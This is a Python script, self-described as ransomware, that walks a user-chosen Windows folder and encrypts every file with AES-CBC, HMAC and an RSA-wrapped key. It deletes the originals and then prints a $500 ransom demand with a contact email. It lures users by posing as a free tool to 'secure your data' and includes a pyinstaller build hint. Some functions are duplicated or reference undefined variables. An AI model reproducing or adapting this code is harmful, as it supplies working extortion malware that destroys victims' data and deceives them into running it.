#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri Feb 07 10:33:48 2020

@author: Kurt Tito
"""
import os, sys, io, json, base64
from cryptography.hazmat.primitives import padding, serialization, hashes, asymmetric, hmac
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
#from Crypto.PublicKey import RSA
from Cryptodome.PublicKey import RSA
from array import array
import binascii
from os import listdir
from os.path import isfile, join
from colorama import Fore, Style, init
from send2trash import send2trash
# run pyinstaller ransomware.py to build exe

init()

def Encrypt(message, key):
    # Check if key is less than 32
    if (len(key) < 32):
        print ("This key is less than 32 bytes")
        sys.exit(0)

    # Convert key and message into bytes
    message_bytes = bytes(message)
    key_bytes = key

    # Create Padder
    padder = padding.PKCS7(128).padder()

    # Padding message in bytes
    padded_message_bytes = padder.update(message_bytes) + padder.finalize()

    # Generate random IV
    iv = os.urandom(16)

    # Creates AES CBC cipher
    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), default_backend())

    # Encrypt cipher
    encryptor = cipher.encryptor()

    # Create ciphertext
    c = encryptor.update(padded_message_bytes) + encryptor.finalize()
    return c, iv

def Decrypt(c, iv, key):
    # Convert key to bytes
    key_bytes = binascii.unhexlify(key.encode('utf-8'))

    # Convert IV to bytes
    iv_bytes = binascii.unhexlify(iv.encode('utf-8'))

    # Convert c to bytes
    c_bytes = binascii.unhexlify(c.encode('utf-8'))
    print("Cbytes converted from string back to bytes")
    print(c_bytes)

    # Create AES CBC cipher
    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv_bytes), default_backend())

    # Create Decryptor for cipher
    decryptor = cipher.decryptor()

    # Original Message but in bytes with padding
    message_bytes_padded = decryptor.update(c_bytes) + decryptor.finalize()

    # Create unpadder
    unpadder = padding.PKCS7(256).unpadder()

    # Unpadding message in bytes
    message_bytes= unpadder.update(message_bytes_padded) + unpadder.finalize()

    # Convert message in bytes form to string
    return message_bytes

def MydecryptMAC(c, iv, tag, encKey, HMACKey):
    # Convert to bytes
        HMACKey_bytes = binascii.unhexlify(HMACKey.encode('utf-8'))
        encKey_bytes = binascii.unhexlify(encKey.encode('utf-8'))

    # Verify Tag
        h = hmac.HMAC(HMACKey_bytes, hashes.SHA256(), backend=default_backend())
        h.update(c)
        h.verify(tag)

    # Decrypting...
        cipher = Cipher(algorithms.AES(encKey_bytes), modes.CBC(iv), default_backend())
        decryptor = cipher.decryptor()
        message_bytes_padded = decryptor.update(c) + decryptor.finalize()

    # Unpadding...
        unpadder = padding.PKCS7(128).unpadder()
        message_bytes= unpadder.update(message_bytes_padded) + unpadder.finalize()

    # Convert to string
        message = message_bytes.decode('utf-8')

    # Return message
        return message

####### ---------------------------------------------------- RANSOMWARE MODULES ------------------------------------------------------------- #########

def MyfileEncryptMAC(filepath):
    # Open file as bytes
    with open(filepath, "rb") as f:
        byte_array = bytearray(f.read())
        content = bytes(byte_array)

    # Generate keys
    encKey = os.urandom(32)
    HMACKey = os.urandom(32)

    # Get file extension
    filepath, ext = os.path.splitext(filepath)

    # Call Encrypt module
    enc = Encrypt(content, encKey)
    c = enc[0] # This is our encrypted message
    iv = enc [1] # This is our Initialization Vector

    # hash our encrypted message
    # h = generateHMAC(HMACKey, c) #this is the hash of the encrypted message

    # HMAC
    h = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())
    h.update(c)
    tag = h.finalize()

    # Convert to string
    c_string = binascii.hexlify(c).decode('utf-8')
    tag_string = binascii.hexlify(tag).decode('utf-8')
    iv_string = binascii.hexlify(iv).decode('utf-8')
    encKey_string = binascii.hexlify(encKey).decode('utf-8')
    HMACKey_string = binascii.hexlify(HMACKey).decode('utf-8')
    ext_string = str(ext)

        #print("File in bytes converted tos string")
        #print(c_string)

    # Create and store JSON data for storing into JSON file
    data = {'c': c_string,
    'iv': iv_string,
    'encKey': encKey_string,
    'HMACKey': HMACKey_string,
    'tag': tag_string,
    'ext': ext_string
    }

    # Store encoded JSON data to JSON file
    with open(os.getcwd() + '\\hmac\\HMACdata.json', 'w') as f:
        json.dump(data, f)

    return c, iv, encKey, HMACKey, tag, ext

# This function module is not needed anymore
def MyfileDecryptMAC():
    # Open and Decodes JSON file
    with open(os.getcwd() + '\\hmac\\HMACdata.json', 'r') as f:
        data = json.load(f)

    # In bytes
    c = binascii.unhexlify(data['c'].encode('utf-8'))
    iv = binascii.unhexlify(data['iv'].encode('utf-8'))
    encKey = binascii.unhexlify(data['encKey'].encode('utf-8'))
    HMACKey = binascii.unhexlify(data['HMACKey'].encode('utf-8'))
    tag = binascii.unhexlify(data['tag'].encode('utf-8'))
    ext = data['ext']

    # Verify Tag
    h = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())
    h.update(c)
    h.verify(tag)

    # Decrypting...
    cipher = Cipher(algorithms.AES(encKey), modes.CBC(iv), default_backend())
    decryptor = cipher.decryptor()
    originalfile_bytes_padded = decryptor.update(c) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(originalfile_bytes_padded)
    originalfile_bytes = data + unpadder.finalize()

    print(originalfile_bytes)

    # Save file
    savefilePath = "hmac//MAC_FileEncrypt_output"
    savefilePath += str(ext)

    f = open(savefilePath, "wb")
    f.write(bytearray(originalfile_bytes))
    f.close()

def MydecryptMAC():

    # Open and read rsa_data
    with open('hmac//rsa_data.json', 'r') as f:
        rsa_data = json.load(f)

    # Open, read, and store private key as var
    with open(RSA_PrivateKey_filepath, 'rb') as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password = None,
            backend = default_backend()
            )

    # In bytes
    RSACipher = binascii.unhexlify(rsa_data['RSACipher'].encode('utf-8'))
    c = binascii.unhexlify(rsa_data['c'].encode('utf-8'))
    iv = binascii.unhexlify(rsa_data['iv'].encode('utf-8'))
    ext = rsa_data['ext']

    # Decrypt private key and store as key
    key = private_key.decrypt(
        RSACipher,
        asymmetric.padding.OAEP(
            mgf=asymmetric.padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
            )
        )

    # Decrypting...
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), default_backend())
    decryptor = cipher.decryptor()
    originalfile_bytes_padded = decryptor.update(c) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(originalfile_bytes_padded)
    originalfile_bytes = data + unpadder.finalize()

    print(originalfile_bytes)

    # Save file
    savefilePath = "hmac//NSA_Highly_Classified"
    savefilePath += str(ext)

    f = open(savefilePath, "wb")
    f.write(bytearray(originalfile_bytes))
    f.close()

def MyRSAEncryptMAC(filepath, RSA_PublicKey_filepath, fileNumber):

    # Encrypt file and create and store data into HMACdata.json
    MyfileEncryptMAC(filepath)

    # Open and store data from HMACdata.json into 'data'
    with open(os.getcwd() + '\\hmac\\HMACdata.json', 'r') as f:
        data = json.load(f)

    # Convert data to bytes
    c = binascii.unhexlify(data['c'].encode('utf-8'))
    iv = binascii.unhexlify(data['iv'].encode('utf-8'))
    encKey = binascii.unhexlify(data['encKey'].encode('utf-8'))
    HMACKey = binascii.unhexlify(data['HMACKey'].encode('utf-8'))
    ext = data['ext']

    # Concatenate encryption key and HMAC key
    m = encKey + HMACKey

    # Open and read public key file
    with open (RSA_PublicKey_filepath, 'rb') as key_file:
        public_key = serialization.load_pem_public_key(key_file.read(), default_backend())

    # Create cipher for public key
    RSACipher = public_key.encrypt(
        m,
        asymmetric.padding.OAEP(
            mgf=asymmetric.padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label = None
            )
        )

    # Create tag
    digest = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())
    digest.update(c)
    tag = digest.finalize()

    # Convert to string
    RSACipher_string = binascii.hexlify(RSACipher).decode('utf-8')
    c_string = binascii.hexlify(c).decode('utf-8')
    iv_string = binascii.hexlify(iv).decode('utf-8')
    tag_string = binascii.hexlify(tag).decode('utf-8')
    ext_string = ext

    # Write to JSON
    data = {'RSACipher': RSACipher_string,
    'c': c_string,
    'iv': iv_string,
    'tag': tag_string,
    'ext': ext_string
    }

    # Get parent directory of filepath
    parent = os.path.abspath(os.path.join(filepath, os.pardir))

    # Write JSON data to rsa_data.encrypted file
    with open(parent + '\hmac_rsa_data_'+ str(bin(fileNumber)) + '.encrypted', 'w+') as f:
        json.dump(data, f)

    # Remove original file
    os.remove(filepath)

    # Flavor text
    if fileNumber == 0:
        print(Fore.LIGHTGREEN_EX)
        print(c)
        print(" ") # new line

    print(Fore.LIGHTGREEN_EX + "Encrypted " + filepath)
    return RSACipher, c, iv, tag, ext

def MyRSADecryptMAC(filepath, RSA_PrivateKey_filepath, fileNumber):

    # Open and read rsa_data
    with open(filepath, 'r') as z:
        rsa_data = json.load(z)

    # Open, read, and store private key as var
    with open(RSA_PrivateKey_filepath, 'rb') as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password = None,
            backend = default_backend()
            )

    # Convert data from rsa_data.json into bytes
    RSACipher = binascii.unhexlify(rsa_data['RSACipher'].encode('utf-8'))
    c = binascii.unhexlify(rsa_data['c'].encode('utf-8'))
    iv = binascii.unhexlify(rsa_data['iv'].encode('utf-8'))
    tag = binascii.unhexlify(rsa_data['tag'].encode('utf-8'))
    ext = rsa_data['ext']

    # Decrypt private key and store as key
    key = private_key.decrypt(
        RSACipher,
        asymmetric.padding.OAEP(
            mgf=asymmetric.padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
            )
        )

    # Splitting derived key into encryption key and decryption key
    encKey = key[0:32]
    HMACKey = key[32:64]

    # Verify Tag
    h = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())
    h.update(c)
    h.verify(tag)

    # Decrypts and unpads encrypted data
    cipher = Cipher(algorithms.AES(encKey), modes.CBC(iv), default_backend())
    decryptor = cipher.decryptor()
    originalfile_bytes_padded = decryptor.update(c) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(originalfile_bytes_padded)
    originalfile_bytes = data + unpadder.finalize()

    # Print original files data in bytes
    print(Fore.LIGHTGREEN_EX + "Decrypted " + filepath)
    #print(originalfile_bytes)

    # Create filepath and add proper file type extension
    encFilePath = filepath.strip('.encrypted')
    encFilePath += str(ext)

    # Open filepath, if not already exist, then create one and write the original files data (in bytes) onto it
    f = open(encFilePath, "wb")
    f.write(bytearray(originalfile_bytes))
    f.close()
    os.remove(filepath)

def main():

    # Create keys and hmac directories
    if not os.path.exists(os.getcwd() + '\\keys\\'):
        os.makedirs(os.getcwd() + '\\keys\\')

    if not os.path.exists(os.getcwd() + '\\hmac\\'):
        os.makedirs(os.getcwd() + '\\hmac\\')

    # Ask for file path folder to encrypt
    print(Fore.LIGHTCYAN_EX + "Enter Windows folder path to encrypt and secure your data for free!! ")
    print("You can always decrypt desired folder by running this program again and entering encrypted folder path.")
    print("   Example Path:        C:\\Users\\Jane Doe\\Documents\\Work\\")
    confirmPath = input("   Folder Path:         ")
    mypath = confirmPath.replace("/", "\\")

    isEncrypted = False

    for root, dirs, files in os.walk(mypath, topdown=True):
        for name in files:
            if(name[-10:] == '.encrypted'):
                isEncrypted = True
                break
            break

    if(isEncrypted):
        print("File(s) in the folder already encrypted. Locate 'rsa_private_key.pem' file and enter full file path to decrypt.")
        print("   Example Path:        C:\\Users\\Jane Doe\\Downloads\\rsa_private_key.pem")
        RSA_PrivateKey_filepath = input("   Private Key Path:    ")
        counter = 0
        for root, dirs, files in os.walk(mypath, topdown=True):
            for name in files:
                MyRSADecryptMAC(os.path.join(root, name), RSA_PrivateKey_filepath, counter)
                counter += 1
    else:
        # Generate RSA key for key pairs
        new_key = RSA.generate(4096)

        # Create and write public key to pem file
        public_key = new_key.publickey().exportKey("PEM")
        f = open(os.getcwd() + '\\keys\\rsa_public_key.pem', 'wb')
        f.write(public_key)
        f.close()

        # Create and write private key to pem file
        private_key = new_key.exportKey("PEM")
        f = open(os.getcwd() + '\\keys\\rsa_private_key.pem', 'wb')
        f.write(private_key)
        f.close()

        # Send the private key file to recycling bin
        # send2trash(os.getcwd() + '\\keys\\rsa_private_key.pem')

        # Initialize Filepaths for target file, public key, and private key
        RSA_PublicKey_filepath = os.getcwd() + '\\keys\\rsa_public_key.pem'
        RSA_PrivateKey_filepath = os.getcwd() + '\\keys\\rsa_private_key.pem'

        counter = 0
        for root, dirs, files in os.walk(mypath, topdown=True):
            for name in files:
                MyRSAEncryptMAC(os.path.join(root, name), RSA_PublicKey_filepath, counter)
                counter += 1

        checker = True

        print(Fore.LIGHTRED_EX + " \nHA HAHA HA. I WAS KIDDING. YOUR FILES ARE NOW ENCRYPTED FOREVER UNLESS \nYOU EMAIL 'someonewatsitoya@gmail.com' AND SEND $500. ONCE THE $500 IS SENT,")
        print("FURTHER INSTRUCTIONS FOR DECRYPTING YOUR FILES WILL BE SENT")

    exit = input("Press [ENTER] to exit program...")

    # When encrypted, ask to decrypt files
    '''
    while (checker):
        confirm = input("Would you like to decrypt? Y/N ")
        confirm = confirm.upper()
        if confirm == 'Y':
            counter = 0

            for root, dirs, files in os.walk(mypath, topdown=True):
                for name in files:
                    MyRSADecryptMAC(os.path.join(root, name), RSA_PrivateKey_filepath, counter)
                    counter += 1

            checker = False
        elif confirm == "N":
            print("Exiting Program...")
            checker = False
        else:
            print("Invalid Input")
    '''
# Execute main function
main()